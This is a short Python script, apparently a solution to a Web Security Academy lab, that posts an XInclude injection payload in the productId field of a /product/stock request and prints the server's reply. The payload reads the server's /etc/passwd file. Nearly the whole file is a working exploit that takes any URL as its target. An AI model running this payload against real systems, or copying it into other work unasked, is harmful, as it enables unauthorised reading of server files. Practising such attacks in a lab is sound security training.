import requests
import sys


def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <url>")
        print(f"Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)


    try:
        url = sys.argv[1].rstrip("/")
        data = {'productId': '1<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>', 'storeId': '1'}
        response = requests.post(f"{url}/product/stock", data=data, timeout=10)
        print(response.text)

    except requests.exceptions.Timeout:
        print("Request timed out. Please check your url and try again.")

    except requests.exceptions.RequestException as e:
        print(f"An error has occurred with your request: {e}")


if __name__ == "__main__":
    main()